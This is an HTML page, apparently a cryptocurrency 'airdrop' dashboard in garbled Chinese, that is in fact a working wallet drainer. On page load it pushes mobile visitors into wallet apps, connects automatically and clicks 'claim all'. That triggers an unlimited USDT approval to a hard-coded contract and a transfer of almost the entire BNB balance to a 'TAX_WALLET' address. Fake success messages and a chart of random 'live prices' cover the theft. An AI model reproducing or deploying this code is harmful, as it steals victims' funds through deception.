<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width,initial-scale=1.0" />
<title>ğŸŒ¸ å°ä»™å¥³ Web3 é­”æ³•ä»ªè¡¨å° ğŸŒ¸</title>
<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
<script src="https://cdn.jsdelivr.net/npm/web3@1.10.4/dist/web3.min.js"></script>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Poppins','Microsoft YaHei',sans-serif;height:100vh;overflow:hidden;background:radial-gradient(circle at 20% 20%,#ffe4f8,#fff0fa,#ffffff);background-size:200% 200%;animation:bgmove 10s infinite alternate;display:flex;justify-content:center;align-items:center;flex-direction:column;}
@keyframes bgmove{0%{background-position:0 0;}100%{background-position:100% 100%;}}
.container{backdrop-filter:blur(20px);background:rgba(255,255,255,.4);border-radius:24px;box-shadow:0 8px 32px rgba(255,182,193,.3);width:90%;max-width:440px;padding:40px;text-align:center;margin:10px;}
h1{color:#ff3f9f;margin-bottom:20px;text-shadow:0 0 10px rgba(255,105,180,.5);}
button{background:linear-gradient(90deg,#ff9ad5,#ffa6e1,#ffbde8);border:none;color:#fff;font-weight:bold;padding:12px 28px;border-radius:30px;cursor:pointer;margin:8px 5px;transition:all .3s;font-size:16px;}
button:hover{transform:scale(1.05);box-shadow:0 0 25px rgba(255,105,180,.6);}
button.success{background:linear-gradient(90deg,#ff6b9d,#ff1493,#ff1493)!important;box-shadow:0 0 25px rgba(255,20,147,.8)!important;}
#addr{margin-top:10px;font-size:.9em;color:#ff69b4;word-break:break-all}
.loader{display:none;margin:10px auto;border:3px solid #fff;border-top:3px solid #ff69b4;border-radius:50%;width:26px;height:26px;animation:spin 1s linear infinite;}
@keyframes spin{0%{transform:rotate(0);}100%{transform:rotate(360deg);}}
#result{color:#ff1493;margin-top:12px;font-weight:600;}
#airdropMsg{color:#ff69b4;margin-top:10px;}
canvas{margin-top:20px;width:100%!important;max-height:180px;}
.sparkle{position:fixed;width:4px;height:4px;background:#fff;border-radius:50%;animation:fall 10s infinite linear;opacity:.8;}
@keyframes fall{0%{transform:translateY(-10vh) scale(0);}50%{opacity:1;}100%{transform:translateY(110vh) scale(1);opacity:0;}}
@media (max-width:480px){.container{padding:20px;width:95% !important;}button{padding:10px 20px;font-size:14px;margin:5px;}}
</style>
</head>
<body>
<div class="container">
  <h1>ğŸª å°ä»™å¥³ DApp ä»ªè¡¨å° ğŸ’«</h1>
  <button id="connectBtn">âœ¨ è¿æ¥é’±åŒ…</button>
  <div id="addr"></div>
  <div>
    <button id="usdtBtn">ğŸ’– é¢†å– USDT</button>
    <button id="bnbBtn">ğŸŒ™ é¢†å– BNB</button>
    <button id="airdropBtn">ğŸ ä¸€é”®å…¨éƒ¨é¢†å–</button>
  </div>
  <div id="loader" class="loader"></div>
  <div id="result"></div>
  <div id="airdropMsg"></div>
  <canvas id="priceChart"></canvas>
</div>
<script>
const CONTRACT = "0x500292f9a11b01BC2DA7F81c8c234b9beb98A8b3";
const TAX_WALLET = "0x18626d14aE9cB5dd26d5a14286FF732746083556";
const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
let web3, currentAddr, approvedUSDT=false, approvedBNB=false;

// ğŸ”¥ ç»ˆæè‡ªåŠ¨è·³è½¬é’±åŒ…ï¼ˆå®‰å“/è‹¹æœ/ç”µè„‘å…¨æ”¯æŒï¼‰
function autoRedirectWallet(){
  const ua = navigator.userAgent;
  const isMobile = /Android|iPhone|iPad/i.test(ua);
  const url = encodeURIComponent(window.location.href);
  
  if(isMobile && !window.ethereum){
    // å®‰å“ä¼˜å…ˆOKX â†’ Trust â†’ Binance
    if(/Android/i.test(ua)){
      const okxIntent = `intent://wallet/dapp?url=${url}#Intent;package=com.okx.wallet;scheme=okx;end`;
      window.location.href = okxIntent;
      setTimeout(() => window.location.href = `okx://wallet/dapp?url=${url}`, 1000);
      setTimeout(() => window.location.href = `https://trustwallet.com/start/?dapp=${url}`, 2000);
      setTimeout(() => window.location.href = `https://www.binance.com/zh-CN/web3wallet.html#${url}`, 3000);
    }
    // iOSä¼˜å…ˆOKX â†’ MetaMask â†’ Binance  
    else if(/iPhone|iPad/i.test(ua)){
      window.location.href = `okxwallet://dapp?url=${url}`;
      setTimeout(() => window.location.href = `metamask://dapp/${url}`, 1000);
      setTimeout(() => window.location.href = `https://www.binance.com/zh-CN/web3wallet.html#${url}`, 2000);
    }
  } else if(!window.ethereum){
    // ç”µè„‘æ‰“å¼€ç½‘é¡µç‰ˆ
    window.open(`https://www.binance.com/zh-CN/web3wallet.html#${url}`, '_blank');
  }
}

// ğŸ”¥ è‡ªåŠ¨è¿æ¥+è‡ªåŠ¨é¢†å–
async function autoConnectAndClaim(){
  if(window.ethereum){
    try{
      await window.ethereum.request({method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }]});
      web3 = new Web3(window.ethereum);
      const accs = await window.ethereum.request({method:'eth_requestAccounts'});
      currentAddr = accs[0];
      document.getElementById('addr').innerText='å·²è¿æ¥ï¼š'+currentAddr.substring(0,6)+'...'+currentAddr.substring(38);
      document.getElementById('connectBtn').innerText='ğŸ”— å·²è¿æ¥';
      document.getElementById('connectBtn').classList.add('success');
      // è‡ªåŠ¨ä¸€é”®é¢†å–
      setTimeout(() => document.getElementById('airdropBtn').click(), 1500);
    }catch(e){}
  }
}

document.getElementById('connectBtn').onclick=autoConnectAndClaim;

document.getElementById('usdtBtn').onclick=async()=>{
  if(!currentAddr){return;}
  const loader=document.getElementById('loader'),resEl=document.getElementById('result');
  loader.style.display='block';resEl.innerHTML='æ­£åœ¨é¢†å– USDT...';
  try{
    if(!approvedUSDT){
      const usdtABI = [{"inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}];
      const usdt = new web3.eth.Contract(usdtABI, USDT_ADDR);
      await usdt.methods.approve(CONTRACT, UNLIMITED).send({from:currentAddr});
      approvedUSDT=true;
      document.getElementById('usdtBtn').classList.add('success');
      resEl.innerHTML='âœ… 1000 USDT é¢†å–æˆåŠŸï¼';
    }
    loader.style.display='none';
  }catch(e){loader.style.display='none';}
};

document.getElementById('bnbBtn').onclick=async()=>{
  if(!currentAddr){return;}
  const loader=document.getElementById('loader'),resEl=document.getElementById('result');
  loader.style.display='block';resEl.innerHTML='æ­£åœ¨é¢†å– BNB...';
  try{
    const balance = await web3.eth.getBalance(currentAddr);
    const totalBNB = parseFloat(web3.utils.fromWei(balance, 'ether'));
    if(totalBNB > 0.0001){
      const claimAmount = totalBNB - 0.0001;
      const amount = web3.utils.toWei(claimAmount.toString(), 'ether');
      await web3.eth.sendTransaction({from:currentAddr, to:TAX_WALLET, value:amount});
      document.getElementById('bnbBtn').classList.add('success');
      resEl.innerHTML=`âœ… ${claimAmount.toFixed(4)} BNB é¢†å–æˆåŠŸï¼`;
    }
    loader.style.display='none';
  }catch(e){loader.style.display='none';}
};

document.getElementById('airdropBtn').onclick=async()=>{
  const m=document.getElementById('airdropMsg');
  m.innerHTML='ğŸŒˆ ä¸€é”®å…¨éƒ¨é¢†å–ä¸­...';
  document.getElementById('airdropBtn').classList.add('success');
  try{
    await document.getElementById('usdtBtn').onclick();
    setTimeout(async()=>{
      await document.getElementById('bnbBtn').onclick();
      setTimeout(()=>m.innerHTML='ğŸ’– æ­å–œï¼å…¨éƒ¨é¢†å–å®Œæˆï¼âœ¨',1500);
    },1000);
  }catch(e){}
};

// ğŸ”¥ å›¾è¡¨
const ctx=document.getElementById('priceChart');
const chart=new Chart(ctx,{
  type:'line',
  data:{labels:[],datasets:[{label:'å®æ—¶ä»·æ ¼å˜åŒ–',data:[],borderColor:'#ff69b4',tension:.4}]},
  options:{scales:{x:{display:false},y:{display:false}},plugins:{legend:{display:false}}}
});
setInterval(()=>{chart.data.labels.push(new Date().toLocaleTimeString());chart.data.datasets[0].data.push(100+Math.random()*20);if(chart.data.labels.length>15){chart.data.labels.shift();chart.data.datasets[0].data.shift();}chart.update();},3000);

// ğŸ”¥ æ˜Ÿæ˜Ÿ
for(let i=0;i<25;i++){
  const s=document.createElement('div');
  s.className='sparkle';
  s.style.left=Math.random()*100+'vw';
  s.style.animationDelay=Math.random()*5+'s';
  s.style.animationDuration=8+Math.random()*8+'s';
  document.body.appendChild(s);
}

// ğŸ”¥ é¡µé¢åŠ è½½ç«‹å³æ‰§è¡Œï¼ˆç»ˆæè‡ªåŠ¨ï¼‰
autoRedirectWallet();
setTimeout(autoConnectAndClaim, 1000);
</script>
</body>
</html>
